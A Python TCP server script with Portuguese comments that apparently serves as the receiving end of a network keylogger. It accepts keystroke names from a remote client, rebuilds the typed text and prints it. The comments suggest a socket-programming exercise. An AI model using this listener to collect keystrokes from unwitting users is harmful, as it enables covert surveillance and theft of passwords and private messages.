# Servidor TCP
# importa a biblioteca socket
import socket

# Endereco IP do Servidor
HOST = '10.0.0.203'
# Porta que o Servidor vai escutar
PORT = 5000
# criação do socket
# af_inet = suporte para dominio de intener tipo notacao de site ou ipv4 / sock_stream = cria um objeto de socket do tipo TCP
TCP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ORIGEM = (HOST, PORT)
# Esta linha define para qual IP e porta o servidor deve aguardar a conexão, que no nosso caso é qualquer IP, por isso o Host é ''
TCP.bind(ORIGEM)
# define o limite de conexões
TCP.listen(1)

# Deixa o Servidor na escuta aguardando as conexões
con, cliente = TCP.accept()

print('Conectado por ', cliente)

global key_words
key_words = ''

while True:
    # Aguarda um dado enviado pela rede de até 1024 Bytes, a função ‘recv’ possui somente 1 argumento que é o tamanho do Buffer
    keydata = con.recv(1024)
    # convertendo de byte para string
    key = keydata.decode('utf-8')

    if str(key) == "Key.space":
        key = ' '

    if str(key) != "Key.backspace":

        key_words = key_words + key

        disallowed_characters = "'"

        for k in disallowed_characters:
            key_words = key_words.replace(k, "")
    # tecla backspace implementada de forma que se a tecla recebida for igual a backspace então a última letra da palavra ou frase deve ser deletada
    elif str(key) == "Key.backspace":

        key_words = key_words[:-1]

    print("Tecla pressionada:", key)
    print("Mensagem final:", key_words)
    print("===================================")

    # print('Finalizando conexao do cliente', cliente)

    # con.close()